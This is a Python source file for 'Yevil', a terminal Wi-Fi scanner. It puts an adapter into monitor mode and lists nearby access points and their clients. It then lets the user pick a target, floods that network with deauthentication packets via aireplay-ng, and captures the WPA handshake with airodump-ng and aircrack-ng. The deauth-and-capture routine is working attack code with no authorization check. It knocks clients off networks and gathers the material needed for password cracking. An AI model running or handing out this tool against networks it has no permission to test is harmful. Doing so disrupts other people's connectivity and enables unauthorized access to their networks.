#!/usr/bin/env python3
"""
Yevil - Real‑time WiFi Scanner v2.5.0
- Curses TUI for live scanning.
- Persistent AP summary after exit.
- Select AP for focused scan + deauth attack + handshake detection.
- Clean deauth output, auto reset.
"""

import os
import sys
import subprocess
import re
import time
import signal
import glob
import curses
from collections import defaultdict

# ============================================
# GLOBALS
# ============================================

MONITOR_INTERFACE = None
SCANNER_PROCESS = None
CSV_PREFIX = "/tmp/yevil_scan"

networks = {}               # bssid -> {ssid, bssid, power, channel, encryption}
clients = defaultdict(set)  # bssid -> set of station MACs

# ============================================
# CLEANUP & UTILITIES
# ============================================

def cleanup_files():
    for f in glob.glob(f"{CSV_PREFIX}*"):
        try:
            os.remove(f)
        except:
            pass


def cleanup():
    global SCANNER_PROCESS
    if SCANNER_PROCESS:
        try:
            SCANNER_PROCESS.terminate()
            time.sleep(0.3)
            if SCANNER_PROCESS.poll() is None:
                SCANNER_PROCESS.kill()
        except:
            pass
        SCANNER_PROCESS = None
    cleanup_files()


def reset_adapter():
    global MONITOR_INTERFACE
    if MONITOR_INTERFACE:
        try:
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'down'], capture_output=True)
            subprocess.run(['iw', 'dev', MONITOR_INTERFACE, 'set', 'type', 'managed'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', MONITOR_INTERFACE, 'up'], capture_output=True)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
            print(f"[+] Restored {MONITOR_INTERFACE} to managed mode.")
        except:
            pass


def detect_adapters():
    adapters = []
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                adapter = line.split()[0]
                if adapter not in adapters:
                    adapters.append(adapter)
    except:
        pass
    return adapters


def set_monitor_mode(adapter):
    global MONITOR_INTERFACE
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'down'], check=True, capture_output=True)
        subprocess.run(['iw', 'dev', adapter, 'set', 'type', 'monitor'], check=True, capture_output=True)
        subprocess.run(['ip', 'link', 'set', adapter, 'up'], check=True, capture_output=True)
        MONITOR_INTERFACE = adapter
        return True
    except Exception:
        return False

# ============================================
# CSV PARSER
# ============================================

def parse_csv_file(csv_file):
    global networks, clients
    if not os.path.exists(csv_file):
        return

    temp_nets = {}
    temp_clients = defaultdict(set)

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        parsing_stations = False

        for line in lines:
            line = line.strip()
            if not line:
                continue

            if line.startswith("Station MAC"):
                parsing_stations = True
                continue

            parts = [p.strip() for p in line.split(',')]

            if not parsing_stations:
                if len(parts) >= 14 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    bssid = parts[0]
                    power = parts[8]
                    channel = parts[3]
                    privacy = parts[5]
                    ssid = parts[13] if parts[13] else "<Hidden>"
                    temp_nets[bssid] = {
                        'bssid': bssid,
                        'power': power,
                        'channel': channel,
                        'encryption': privacy,
                        'ssid': ssid
                    }
            else:
                if len(parts) >= 6 and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', parts[0]):
                    client_mac = parts[0]
                    associated_bssid = parts[5]
                    if re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', associated_bssid):
                        temp_clients[associated_bssid].add(client_mac)

        networks = temp_nets
        clients = temp_clients
    except Exception:
        pass

# ============================================
# CURSES TUI (LIVE SCANNING DISPLAY)
# ============================================

def curses_display(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(400)

    curses.start_color()
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)
    curses.init_pair(2, curses.COLOR_YELLOW, -1)
    curses.init_pair(3, curses.COLOR_RED, -1)
    curses.init_pair(4, curses.COLOR_CYAN, -1)

    target_csv = f"{CSV_PREFIX}-01.csv"

    while True:
        key = stdscr.getch()
        if key in (ord('q'), ord('Q'), 3):
            break

        parse_csv_file(target_csv)
        stdscr.erase()

        max_y, max_x = stdscr.getmaxyx()

        title = "=== YEVIL - REAL-TIME WI-FI SCANNER ==="
        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.color_pair(4) | curses.A_BOLD)

        header = f"{'NUM':<4} {'ESSID':<28} {'CH':<4} {'ENCR':<8} {'POWER':<8} {'CLIENTS':<7} {'BSSID'}"
        stdscr.addstr(2, 0, header[:max_x - 1], curses.color_pair(4) | curses.A_BOLD)
        stdscr.addstr(3, 0, "-" * min(max_x - 1, 80), curses.color_pair(4))

        def get_power(net):
            try:
                return int(net['power'])
            except:
                return -100

        sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

        row_idx = 4
        for idx, net in enumerate(sorted_nets, 1):
            if row_idx >= max_y - 2:
                break
            try:
                pwr = int(net['power'])
                color = curses.color_pair(1) if pwr > -60 else curses.color_pair(2) if pwr > -75 else curses.color_pair(3)
            except:
                color = curses.color_pair(0)

            ssid = net['ssid'][:26]
            client_count = len(clients.get(net['bssid'], set()))
            pwr_str = f"{net['power']} dB" if net['power'].lstrip('-').isdigit() else net['power']

            line = f"{idx:<4} {ssid:<28} {net['channel']:<4} {net['encryption']:<8} {pwr_str:<8} {client_count:<7} {net['bssid']}"
            stdscr.addstr(row_idx, 0, line[:max_x - 1], color)
            row_idx += 1

        footer = "Press 'q' or Ctrl+C to stop scanning and freeze network list."
        stdscr.addstr(max_y - 1, 0, footer[:max_x - 1], curses.color_pair(4) | curses.A_REVERSE)

        stdscr.refresh()

# ============================================
# PERSISTENT POST-EXIT SUMMARY
# ============================================

def print_final_summary():
    if not networks:
        print("\n\033[91m[-] No networks discovered during scan.\033[0m")
        return

    print("\n\033[96m" + "=" * 80)
    print("                    DISCOVERED ACCESS POINTS SUMMARY".center(80))
    print("=" * 80 + "\033[0m")
    print(f"\033[1m\033[93m{'NUM':<4} {'ESSID':<28} {'CH':<4} {'POWER':<8} {'ENCR':<8} {'CLIENTS':<7} {'BSSID'}\033[0m")
    print("\033[96m" + "-" * 80 + "\033[0m")

    def get_power(net):
        try:
            return int(net['power'])
        except:
            return -100

    sorted_nets = sorted(networks.values(), key=get_power, reverse=True)

    for idx, net in enumerate(sorted_nets, 1):
        ssid = net['ssid'][:26]
        pwr_str = f"{net['power']} dB" if net['power'].lstrip('-').isdigit() else net['power']
        client_count = len(clients.get(net['bssid'], set()))
        try:
            pwr = int(net['power'])
            color_code = '\033[92m' if pwr > -60 else '\033[93m' if pwr > -75 else '\033[91m'
        except:
            color_code = '\033[97m'

        line = f"{idx:<4} {ssid:<28} {net['channel']:<4} {pwr_str:<8} {net['encryption']:<8} {client_count:<7} {net['bssid']}"
        print(f"{color_code}{line}\033[0m")

    print("\033[96m" + "=" * 80 + "\033[0m\n")

# ============================================
# TARGETED SCAN WITH DEAUTH + HANDSHAKE DETECTION
# ============================================

def run_targeted_scan(bssid, channel, interface):
    """Launch focused scan + deauth attack, then check for handshake."""
    # Ask for deauth count
    try:
        count = input("[?] Number of deauth packets to send (default 20): ").strip()
        if count == "":
            count = "20"
        else:
            count = int(count)
            count = str(count)
    except ValueError:
        count = "20"
        print("[!] Invalid input, using default 20.")

    # Prepare capture filenames
    cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
    cap_file = f"{cap_prefix}-01.cap"

    # Remove old files
    for f in [cap_file]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    # Start airodump-ng in the background
    cmd_airodump = [
        'sudo', 'airodump-ng',
        '--bssid', bssid,
        '-c', channel,
        '--write', cap_prefix,
        '--output-format', 'pcap',
        interface
    ]
    print(f"\n[+] Starting capture: {' '.join(cmd_airodump)}")
    airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    # Send deauth packets – capture output and print cleanly
    cmd_deauth = [
        'sudo', 'aireplay-ng',
        '-0', count,
        '-a', bssid,
        '--ignore-negative-one',
        interface
    ]
    print(f"\n[+] Sending deauth packets: {' '.join(cmd_deauth)}")
    print("[+] Deauth progress:")
    
    # Use Popen to read output line by line and print with a prefix
    deauth_proc = subprocess.Popen(cmd_deauth,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   text=True,
                                   bufsize=1)
    
    for line in deauth_proc.stdout:
        line = line.strip()
        if line:
            print(f"    {line}")
    deauth_proc.wait()

    # Wait a few seconds for client reconnection
    print("[+] Waiting 5 seconds for potential reconnection...")
    time.sleep(5)

    # Stop airodump-ng
    print("[+] Stopping capture...")
    airo_proc.terminate()
    time.sleep(1)
    if airo_proc.poll() is None:
        airo_proc.kill()

    # Analyse the capture
    if os.path.exists(cap_file):
        print(f"\n[+] Analysing {cap_file} for handshake...")
        try:
            aircmd = ['aircrack-ng', '-b', bssid, cap_file]
            result = subprocess.run(aircmd, capture_output=True, text=True)
            output = result.stdout + result.stderr

            if 'WPA (1 handshake)' in output:
                print("\033[92m\n[✅] HANDSHAKE CAPTURED SUCCESSFULLY!\033[0m")
            elif 'WPA (0 handshake)' in output:
                print("\033[93m\n[!] No handshake found in the capture.\033[0m")
            else:
                print("\n[!] Could not determine handshake status. Try longer capture or stronger deauth.")
        except Exception as e:
            print(f"[-] Error analysing capture: {e}")
    else:
        print("[-] No capture file found. Something went wrong.")

    # Delete capture files automatically
    for f in [cap_file]:
        try:
            os.remove(f)
        except:
            pass
    print("[+] Capture files cleaned up.")

# ============================================
# MAIN EXECUTION
# ============================================

def main():
    global SCANNER_PROCESS

    if os.geteuid() != 0:
        print("[-] This tool requires root privileges! Run with: sudo python3 yevil.py")
        sys.exit(1)

    adapters = detect_adapters()
    if not adapters:
        print("[-] No wireless adapters detected!")
        sys.exit(1)

    print("\n📋 Available Wireless Adapters:")
    for i, adapter in enumerate(adapters, 1):
        print(f"  {i}. {adapter}")

    while True:
        try:
            choice = input("\n[?] Select adapter number: ")
            selected = adapters[int(choice) - 1]
            break
        except (IndexError, ValueError):
            print("[-] Invalid selection!")

    print(f"[*] Setting {selected} into monitor mode...")
    if not set_monitor_mode(selected):
        print("[-] Failed to set monitor mode.")
        sys.exit(1)

    cleanup_files()

    # Launch background airodump-ng for the main scan
    cmd = [
        'airodump-ng', selected,
        '--band', 'abg',
        '--write', CSV_PREFIX,
        '--output-format', 'csv'
    ]

    SCANNER_PROCESS = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print("[*] Launching Real-time Interface...")
    time.sleep(1)

    # Run Curses UI
    try:
        curses.wrapper(curses_display)
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
    finally:
        cleanup()

    # Show summary
    print_final_summary()

    # Target selection & handshake capture
    if networks:
        print("\n[?] Enter the number of the AP to capture a handshake (or press Enter to skip):")
        try:
            choice = input("> ").strip()
            if choice:
                idx = int(choice) - 1
                sorted_nets = sorted(networks.values(),
                                     key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -100,
                                     reverse=True)
                if 0 <= idx < len(sorted_nets):
                    target = sorted_nets[idx]
                    print(f"\n[+] Targeting {target['ssid']} ({target['bssid']}) on channel {target['channel']}")
                    run_targeted_scan(target['bssid'], target['channel'], selected)
                else:
                    print("[-] Invalid selection, skipping.")
        except ValueError:
            print("[-] Invalid input, skipping.")
        except KeyboardInterrupt:
            print("\n[+] Skipped.")

    # Auto reset adapter
    print("\n[+] Restoring adapter to managed mode...")
    reset_adapter()

    print("\n[+] Done. Goodbye!")

if __name__ == "__main__":
    main()
